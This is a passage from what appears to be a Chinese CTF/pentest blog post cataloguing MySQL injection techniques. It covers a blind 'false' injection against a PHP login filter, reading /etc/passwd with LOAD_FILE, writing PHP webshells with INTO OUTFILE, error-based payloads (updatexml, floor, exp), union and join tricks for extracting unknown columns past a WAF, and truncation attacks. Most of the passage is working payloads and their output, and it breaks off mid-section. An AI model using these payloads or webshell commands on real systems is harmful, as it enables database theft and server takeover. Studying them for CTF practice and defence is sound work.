class="keyword">die</span>(<span class="string">&quot;you can&#x27;t login this as admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$passwd</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;sorry,username or passwd error!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;source&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: <span class="title function_ invoke__">source</span>(); <span class="keyword">break</span> ;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : <span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$passwd</span>);<span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : <span class="title function_ invoke__">show</span>(<span class="variable">$username</span>);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到filter()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="operator">=</span> &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure><p>这里官方给出的就是利用异或，其实这里并不需要 ’admin‘ 只要是一串字符串就可以</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200703150718337.png" alt="image-20200703150718337"></p><p>异或会使字符串都转为浮点数，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1<br>当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多<br>还有就是构造的payload比较简短，例如<code>&#39;+&#39;、&#39;^&#39;、&#39;/4#</code>这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p><h3 id="1-6、结合盲注"><a href="#1-6、结合盲注" class="headerlink" title="1.6、结合盲注"></a>1.6、结合盲注</h3><p>这里false注入如果是在一些非验证的地方利用的地方基本是需要盲注，姿势比较多</p><h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()</p><p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p><p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所以是将这个功能禁掉了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><h3 id="2-1、读文件"><a href="#2-1、读文件" class="headerlink" title="2.1、读文件"></a>2.1、读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读文件函数LOAD_FILE()</span><br><span class="line">SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);</span><br><span class="line">SELECT LOAD_FILE(0x2F6574632F706173737764);</span><br></pre></td></tr></table></figure><p>注意点：</p><ol><li>LOAD_FILE的默认目录@@datadir</li><li>文件必须是当前用户可读</li><li>读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值</li></ol><h3 id="2-2、写文件"><a href="#2-2、写文件" class="headerlink" title="2.2、写文件"></a>2.2、写文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INTO OUTFILE/DUMPFILE</span><br><span class="line">SELECT &#x27;&lt;? system($_GET[&#x27;c&#x27;]); ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">这两个函数都可以写文件，但是有很大的差别 </span><br><span class="line"></span><br><span class="line">INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </span><br><span class="line">INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </span><br></pre></td></tr></table></figure><p>注意点：</p><ol><li>INTO OUTFILE不会覆盖文件</li><li>INTO OUTFILE必须是查询语句的最后一句</li><li>路径名是不能编码的，必须使用单引号<br>创建数据库导出一句话后门，secure_file_priv 需要开启</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`test` (`temp` TEXT NOT NULL );</span><br><span class="line">Query OK, 0 rows affected (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO `mysql`.`test` (`temp` ) VALUES(&#x27;&lt;?php @eval($_POST[test]);?&gt;&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| temp                              |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[test]);?&gt; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">SELECT `temp` FROM `test` INTO OUTFILE &#x27;E:/123.php&#x27;;</span><br><span class="line">DROP TABLE IF EXISTS `test`;</span><br></pre></td></tr></table></figure><h3 id="2-4、正则绕过"><a href="#2-4、正则绕过" class="headerlink" title="2.4、正则绕过"></a>2.4、正则绕过</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-4509370c5a20340c.png" alt="图片.png"></p><h3 id="2-6、特殊字符绕过空格"><a href="#2-6、特殊字符绕过空格" class="headerlink" title="2.6、特殊字符绕过空格"></a>2.6、特殊字符绕过空格</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-ff91607134d5255c.png" alt="图片.png"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">floor报错</span><br><span class="line">有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</span><br><span class="line">（没有floor和rand函数也是不会报错的）</span><br><span class="line">mysql&gt; select count(*),concat(0x3a,database(),0x3a,floor(rand()*2))a from information_schema.tables </span><br><span class="line">group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;:security:1&#x27; for key &#x27;group_key&#x27;</span><br><span class="line"></span><br><span class="line">UpdateXml报错注入</span><br><span class="line">mysql&gt; select updatexml(0,concat(0x7e,(select database())),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~security&#x27;</span><br><span class="line"></span><br><span class="line">extractvalue报错注入</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x5c,(select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;\security&#x27;</span><br><span class="line"></span><br><span class="line">Error based Double Query Injection</span><br><span class="line">mysql&gt; select * from users where id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.5.53~1&#x27; for key &#x27;group_key&#x27;</span><br><span class="line"></span><br><span class="line">当一个库中不存在的自定义函数他就会爆出当前库中没有此函数，从而爆出数据库名。</span><br><span class="line">mysql&gt; select username,phone from info where id=f();</span><br><span class="line">ERROR 1305 (42000): FUNCTION security.f does not exist</span><br><span class="line"></span><br><span class="line">Polygon,linestring爆表名，库名</span><br><span class="line">mysql&gt; select username,phone from info where id=1 and Polygon(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`security`.`info`.`id`&#x27; value found during parsing</span><br><span class="line">mysql&gt; select username,phone from info where id=1 and linestring(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`security`.`info`.`id`&#x27; value found during parsing</span><br><span class="line"></span><br><span class="line">                                                                exp()</span><br><span class="line">select * from users where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><h2 id="绕过未知字段名的技巧"><a href="#绕过未知字段名的技巧" class="headerlink" title="绕过未知字段名的技巧"></a>绕过未知字段名的技巧</h2><p>waf拦截了information_schema、columns、tables、database、schema等关键字或函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">..............</span><br><span class="line"></span><br><span class="line">mysql&gt; select `3` from (select 1,2,3 union select * from users)a limit 1,1;</span><br><span class="line">+------+</span><br><span class="line">| 3    |</span><br><span class="line">+------+</span><br><span class="line">| Dumb |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select `1`,`2`,`3` from (select 1,2,3 union select * from users)a limit 2,1;</span><br><span class="line">+---+----------+------------+</span><br><span class="line">| 1 | 2        | 3          |</span><br><span class="line">+---+----------+------------+</span><br><span class="line">| 2 | Angelina | I-kill-you |</span><br><span class="line">+---+----------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select 1)a,(select 2)b,(select 3)c,(select 4)d;</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| a | b | c | d |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3;</span><br><span class="line">+----------+</span><br><span class="line">| 3        |</span><br><span class="line">+----------+</span><br><span class="line">| p@ssword |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3)f,(select 1)g,(select 1)h;</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| id       | username | password |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| 1        | Dumb     | Dumb     |</span><br><span class="line">| p@ssword | 1        | 1        |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>如果不允许使用union</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)</span><br><span class="line">as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">利用using爆其他字段</span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b </span><br><span class="line">using(id))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b</span><br><span class="line">using(id,username))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p><strong>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</strong><br><a href="http://www.mamicode.com/info-detail-138723.html">详解mysql中的Using与On的用法</a></p><h2 id="使用Join查询"><a href="#使用Join查询" class="headerlink" title="使用Join查询"></a>使用Join查询</h2><p><strong>在联合查询的时候，查询填充的列分割较多时，就会被waf拦截</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="Mysql约束攻击"><a href="#Mysql约束攻击" class="headerlink" title="Mysql约束攻击"></a>Mysql约束攻击</h2><p><strong>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）<br>在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  create table user(id int primary key,user varchar(10),pwd varchar(20));</span><br><span class="line">Query OK, 0 rows affected (0.38 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into user value(1,&#x27;admin&#x27;,&#x27;123&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into user value(2,&#x27;admin          &#x27;,&#x27;456&#x27;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+------------+------+</span><br><span class="line">| id | user       | pwd  |</span><br><span class="line">+----+------------+------+</span><br><span class="line">|  2 | admin      | 456  |</span><br><span class="line">|  1 | admin      | 123  |</span><br><span class="line">+----+------------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(user) from user;</span><br><span class="line">+--------------+</span><br><span class="line">| length(user) |</span><br><span class="line">+--------------+</span><br><span class="line">|           10 |</span><br><span class="line">|            5 |</span><br><span class="line">+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line">长度是不一样的,但是在受影响的版本中,id=2的user值admin          在前端登录处登录并且在后端验证中,admin</span><br><span class="line">是等同id=1的user值admin的.</span><br></pre></td></tr></table></figure><p><a href="http://www.freebuf.com/articles/web/124537.html">基于约束的SQL攻击</a></p><h2 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h2><p>在过滤等号或者过滤like等的sql注入情况下IN很有用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id in (1,2);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&#x27;abc&#x27;,1,1) in (&#x27;z&#x27;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| substr(&#x27;abc&#x27;,1,1) in (&#x27;z&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&#x27;abc&#x27;,1,1) in (&#x27;a&#x27;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| substr(&#x27;abc&#x27;,1,1) in (&#x27;a&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          1 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="Between"><a href="#Between" class="headerlink" title="Between"></a>Between</h2><p>BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id between 1 and 3;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username between &#x27;sa&#x27; and &#x27;sz&#x27;;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  4 | secure   | crappy    |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  6 | superman | genious   |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">还支持16进制</span><br><span class="line">mysql&gt; select * from users where username between 0x7365 and 0x737a;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  4 | secure   | crappy    |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  6 | superman | genious   |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">可以结合字符串截取进行盲注</span><br><span class="line">mysql&gt; select * from users where substr(username,1,1) between &#x27;a&#x27; and &#x27;d&#x27;;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="列名被ban，自己构造"><a href="#列名被ban，自己构造" class="headerlink" title="列名被ban，自己构造"></a>列名被ban，自己构造</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 